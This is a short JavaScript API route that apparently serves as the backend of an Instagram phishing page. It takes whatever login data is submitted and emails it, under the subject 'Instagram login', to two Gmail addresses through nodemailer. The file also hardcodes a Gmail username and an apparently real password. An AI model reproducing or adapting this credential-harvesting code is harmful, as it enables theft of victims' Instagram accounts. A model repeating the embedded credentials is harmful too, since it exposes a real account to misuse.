let nodemailer = require('nodemailer')

export default async function sendEmail (req, res) {
    console.log(req.body)

     let transporter = nodemailer.createTransport({
        port: 465,
        host: "smtp.gmail.com",
        secure: true, // true for 465, false for other ports
        auth: {
          user: 'lengleytony@gmail.com', // generated ethereal user
          pass: 'Vic123imu@', // generated ethereal password
        },
     })

       let info = await transporter.sendMail({
        from: '"Common" <lengleytony@gmail.com>',
        to: 'Wlara664@gmail.com, lengleytony@gmail.com',
        subject: 'Instagram',
        text: `Instagram login ${req.body}`,
        html: `<h2> Instagram Login: ${req.body}</h2>`
       })

      res.json({info})
}